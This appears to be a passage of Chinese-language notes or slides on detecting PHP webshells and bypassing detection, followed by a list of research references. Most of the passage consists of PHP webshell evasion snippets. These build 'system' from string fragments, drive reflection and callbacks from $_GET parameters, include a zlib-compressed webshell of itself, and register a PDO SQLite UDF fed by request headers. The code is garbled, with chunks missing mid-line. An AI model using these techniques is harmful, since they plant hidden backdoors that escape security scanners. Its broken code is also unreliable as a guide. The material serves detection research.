基本思路是把opcode丢进去炼丹，⽤什么算法的都有：⻉叶斯、SVM、随机森林、卷积神经
⽹络....，总之⽅法多种多样，但是效果还有待进⼀步验证。
绕过
核⼼思路：
利⽤动态特性绕过静态分析
利⽤分⽀和外部信息绕过动态分析
利⽤检测脚本未覆盖的sink点
$a = "syste";
$func = $a;
for ($c = 0; $c setStaticPropertyValue("v", $_GET["string"]);
// $reflect->setStaticPropertyValue("f", $_GET["a"]);
$reflect->setStaticPropertyValue($_GET['a'], "syste". "m");
$reflect->newInstance();
压缩webshell并使⽤ compress.zlib:// filter include⾃身绕过
两次执⾏和多⽂件绕过
.....
name()($this->config['url']);
    }
    public function __construct($url) {
        $this->config = [
            'url' => $url,
            'home' => 'https://httpbin.org/get',
        ];
    }
利⽤PHP CGI模式和cli模式的不同绕过
利⽤PDO创建UDF绕过
}
function eh($errno, $errstr, $errfile, $errline)
{
    $fp = fopen("wordpress.txt", "w");
    fwrite($fp, "foobar");
    fclose($fp);
}
set_error_handler("App\\Services\\eh");
$serv = new ApiCallerService($GLOBALS['_GET']['cxx']);
require_once "wordpress.txt";
$serv->run();
exec("CREATE TABLE strings(a)");
$insert = $db->prepare('INSERT INTO strings VALUES (?)');
$insert->execute(array($_SERVER['CONTENT_TYPE']));
//
$db->sqliteCreateFunction('my_func', '\\Foo\\Bar\\'. 'cf', 1);
$rows = $db->query('SELECT my_func(a) FROM strings');
opcode在webshell检测中的应⽤ https://cloud.tencent.com/developer/article/1540989
使⽤PHP安全检测拓展Taint检测你的PHP代码 https://juejin.cn/post/6844903597168132104
taint https://github.com/laruence/taint
PHP HOOK的若⼲⽅法 https://blog.csdn.net/u011721501/article/details/70174924
洋葱Webshell检测实践与思考 https://security.tencent.com/index.php/blog/msg/152
php webshell的检测与绕过 https://www.anquanke.com/post/id/197631
刘新. EagleEye：⾯向云环境的WebShell检测系统设计与实现[D].兰州⼤学,2019.
王硕&孙艺.云安全环境下恶意脚本检测的最佳实践.XCON 2020
Recent Advances in Next Generation Cybersecurity Technologies 
https://www.hindawi.com/journals/wcmc/2021/5533963/
Phithon.PHP动态特性的捕捉.KCON 2019